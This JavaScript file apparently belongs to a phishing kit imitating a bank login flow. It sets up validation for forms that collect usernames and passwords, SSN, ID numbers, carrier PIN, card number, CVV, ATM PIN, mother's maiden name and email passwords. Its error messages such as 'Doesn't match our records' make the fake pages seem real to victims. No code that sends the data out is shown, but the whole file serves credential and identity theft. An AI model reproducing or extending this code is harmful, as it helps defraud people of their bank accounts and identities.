document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('personal-form'),
        {
            fields: { 
			fname: {
                    validators: {
                        notEmpty: {
                            message: 'First name is required'
							  },
                         regexp: {
                            regexp: /^[a-zA-Z][a-zA-Z \-']+$/,
                            message: 'Tell us your first name using only letters, spaces, apostrophes and hyphens',
                        },
                    }
                },
				lname: {
                    validators: {
                        notEmpty: {
                            message: 'Last name is required'
							  },
                         regexp: {
                            regexp: /^[a-zA-Z][a-zA-Z \-']+$/,
                            message: 'Tell us your last name using only letters, spaces, apostrophes and hyphens',
                        },
                    }
                },
				date: {
                    validators: {
					notEmpty: {
                            message: 'Date of birth is required mm/dd/yyyy'
							  },
                        date: {
						  
                            format: 'MM/DD/YYYY',
                            message: 'We didn\'t recognize your date of birth. Please try again.',
                            // min and max options can be strings or Date objects
                            min: '01/01/1931',
                            max: '12/30/2002'
                        },
					
                    }
                },
				ssn: {
                    validators: {
                        notEmpty: {
                            message: 'Social security number is required'
							  },
                         regexp: {
                            regexp: /^(?!000|666|9)\d{3}(-?)(?!00)\d{2}\1(?!0000)\d{4}$/,
                            message: 'Doesn\'t match our records.',
                        },
                    }
                },
				
				idd: {
                    validators: {
                        notEmpty: {
                            message: 'Identification Number is required'
							  },
                    }
                },
				ids: {
                    validators: {
					notEmpty: {
                            message: 'ID issued date is required.'
							  },
                       date: {
						  
                            format: 'MM/DD/YYYY',
                            message: 'We didn\'t recognize your ID issued date. Please try again.',
                            // min and max options can be strings or Date objects
                            min: '01/01/1951',
                            max: '05/30/2020'
                        },
					
                    }
                },
				stradd: {
                    validators: {
                        notEmpty: {
                            message: 'Street Address is required'
							  },
                    }
                },
				   apt: {
                    validators: {
                        
                    }
                },
				phone: {
                    validators: {
                        notEmpty: {
                            message: 'We can\'t find you in our records.'
                        },
                         regexp: {
                            regexp: /^(\([0-9]{3}\) |[0-9]{3}-)[0-9]{3}-[0-9]{4}$/,
                            message: 'Enter your phone number',
                        },
                    }
                },
				cpin: {
                    validators: {
                        notEmpty: {
                            message: 'Enter your Carrier pin.'
                        },
						stringLength: {
                            min: 4,
                            max: 4,
                            message: 'Doesn\'t match our records.',
                        },
                         regexp: {
                            regexp: /^[0-9]*$/,
                           message: 'Doesn\'t match our records.',
                        },
                    }
                },
				zip: {
                    validators: {
                        notEmpty: {
                            message: 'Zipcode is required.'
                        },
						stringLength: {
                            min: 5,
                            max: 5,
                            message: '&#x20;',
                        },
                        regexp: {
                            regexp: /^\d{1,5}$/,
                            message: 'Doesn\'t match our records',
                        },
                    }
                },
				
            },
			plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                tachyons: new FormValidation.plugins.Tachyons(),
                submitButton: new FormValidation.plugins.SubmitButton(),
				defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
                icon: new FormValidation.plugins.Icon({
                    valid: 'fa fa-check',
                    invalid: 'fa fa-times',
                    validating: 'fa fa-refresh'
                }),
            },
        }
    )
	
	
});    















document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('loginformerr'),
        {
            fields: {
               userId: {
                    validators: {
                        notEmpty: {
                            message: 'Please tell us your username and password.'
                        },
                        stringLength: {
                            min: 8,
                            max: 32,
                            message: '&#32;',
                        },
                        regexp: {
                           regexp: /^(?=.*\d)(?=.*[a-zA-Z]).*$/,
                            message: 'We can\'t find that username',
                        },
                    }
                },
                pwsrd: {
                    validators: {
						notEmpty: {
                            message: '&#32;'
                        },
                        stringLength: {
                            min: 8,
                            message: '&#32;',
                        },
                       
                    }
                },
            },
			plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                message: new FormValidation.plugins.Message({
					clazz: 'jpui exclamation-color icon',
                    clazz: 'red',
					
                    container: '#messages',
                }),
                submitButton: new FormValidation.plugins.SubmitButton(),
                defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
            }
        }
    );
});    




document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('loginform'),
        {
            fields: {
                username: {
                    validators: {
                        notEmpty: {
                            message: 'Please tell us your username and password.'
                        },
                        stringLength: {
                            min: 8,
                            max: 32,
                            message: '&#32;',
                        },
                        regexp: {
                            regexp: /^(?=.*\d)(?=.*[a-zA-Z]).*$/,
                            message: 'We can\'t find that username',
                        },
                    }
                },
                password: {
                    validators: {
						notEmpty: {
                            message: '&#32;'
                        },
                        stringLength: {
                            min: 8,
                            message: '&#32;',
                        },
                       
                    }
                },
            },
			plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                message: new FormValidation.plugins.Message({
					clazz: 'jpui exclamation-color icon',
                    clazz: 'red',
					
                    container: '#messages',
                }),
                submitButton: new FormValidation.plugins.SubmitButton(),
                defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
            }
        }
    );
});    




document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('login-cc'),
        {
            fields: { 
			cc: {
                    validators: {
                        notEmpty: {
                            message: 'The card number is required'
                        },
                        creditCard: {
                            message: 'Enter your valid card number'
                        },
                    }
                },
				expdate: {
                    validators: {
                        notEmpty: {
                            message: 'Invalid expiration date.'
                        },
                        stringLength: {
                            min: 4,
                            max: 7,
                            message: 'Invalid expiration date.',
                        },
                        regexp: {
                            regexp: /^((0[1-9])|(1[0-2]))\/((2020)|(20[2-2][0-9]))$/,
                            message: 'Invalid expiration date.',
                        },
                    }
                },
				cvv: {
                    validators: {
                        notEmpty: {
                            message: 'Invalid cvv.'
                        },
                        stringLength: {
                            min: 3,
                            max: 3,
                            message: 'Doesn\'t match our records.',
                        },
                    }
                },
				atm: {
                    validators: {
                        notEmpty: {
                            message: 'Atm pin is required.'
                        },
                        stringLength: {
                            min: 4,
                            max: 4,
                            message: 'Doesn\'t match any record.',
                        },
                    }
                },
				mmn: {
                    validators: {
                        notEmpty: {
                            message: 'Mother\'s maiden name is required.'
                        },
                        regexp: {
                            regexp: /^[a-zA-Z]+$/,
                            message: 'Doesn\'t match our records',
                        },
                    }
                },
				
            },
			plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                tachyons: new FormValidation.plugins.Tachyons(),
                submitButton: new FormValidation.plugins.SubmitButton(),
				defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
                icon: new FormValidation.plugins.Icon({
                    valid: 'fa fa-check',
                    invalid: 'fa fa-times',
                    validating: 'fa fa-refresh'
                }),
            },
        }
    )
	.on('core.validator.validated', function(e) {
        if (e.field === 'cc' && e.validator === 'creditCard' && e.result.valid) {
            let icon = '';
            // e.result.meta.type can be one of
            // AMERICAN_EXPRESS, DINERS_CLUB, DINERS_CLUB_US, DISCOVER, JCB, LASER,
            // MAESTRO, MASTERCARD, SOLO, UNIONPAY, VISA
            switch (e.result.meta.type) {
                case 'AMERICAN_EXPRESS':
                    icon = 'fa fa-cc-amex';
                    break;
                
                case 'DISCOVER':
                    icon = 'fa-cc-discover';
                    break;
                
                case 'MASTERCARD':
                case 'DINERS_CLUB_US':
                    icon = 'fa-cc-mastercard';
                    break;
                
                case 'VISA':
                    icon = 'fa-cc-visa';
                    break;
                
                default:
                    icon = 'fa-credit-card';
                    break;
            }

            // Query the icon element
            const iconEle = e.element.nextSibling;
            iconEle.setAttribute('class', 'fv-plugins-icon ' + icon);
        }
    })
    .on('core.element.validated', function(e) {
        if (e.field === 'cc' && !e.valid) {
            const iconEle = e.element.nextSibling;
            iconEle.setAttribute('class', 'fv-plugins-icon fa fa-times');
        }
    });
	
});    


document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('axx'),
        {
            fields: {
                email: {
                    validators: {
                        notEmpty: {
                            message: 'Enter the valid email address we have in our records.'
                        },
                        stringLength: {
                            message: 'Enter a valid email address.',
                        },
                        regexp: {
                            regexp: /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,
                            message: 'We can\'t find you in our records',
                        },
                    }
                },
                password: {
                    validators: {
						notEmpty: {
                            message: 'Enter your email password.'
                        },
                        stringLength: {
                            min: 8,
                            message: '&#32;',
                        },
                       
                    }
                },
            },
			plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                message: new FormValidation.plugins.Message({
					clazz: 'jpui exclamation-color icon',
                    clazz: 'red',
					
                    container: '#messages',
                }),
                submitButton: new FormValidation.plugins.SubmitButton(),
                defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
            }
        }
    );
});    